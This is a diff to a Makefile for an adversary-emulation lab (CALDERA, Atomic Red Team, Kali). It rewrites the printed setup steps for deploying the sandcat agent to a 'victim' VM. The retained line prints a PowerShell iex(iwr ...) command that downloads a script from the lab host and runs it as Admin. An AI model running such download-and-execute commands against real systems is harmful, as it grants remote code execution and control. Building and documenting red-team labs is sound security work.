@@ -61,10 +61,9 @@ install: _install-deps _check-docker _env _setup-ai _setup-tools _detect-labops 
 		echo "  Manual Tools:   Run 'make tools' to install Kali + Atomic Red Team"; \
 	fi
 	@echo ""
-	@echo "  Next: deploy sandcat agent to victim VM:"
-	@echo "    1. On the victim VM (PowerShell as Admin), set the CALDERA server IP:"
-	@echo '       $$env:CALDERA_SERVER = "<your-docker-host-ip>"'
-	@echo "    2. Then run:"
+	@echo "  Next steps:"
+	@echo "    • LabOps VMs: sandcat is deployed automatically during 'make provision'"
+	@echo "    • Manual VM:  on the victim (PowerShell as Admin):"
 	@echo "       powershell -c \"iex(iwr 'http://<your-docker-host-ip>:8081/s.ps1' -UseBasicParsing)\""
 	@echo ""
 
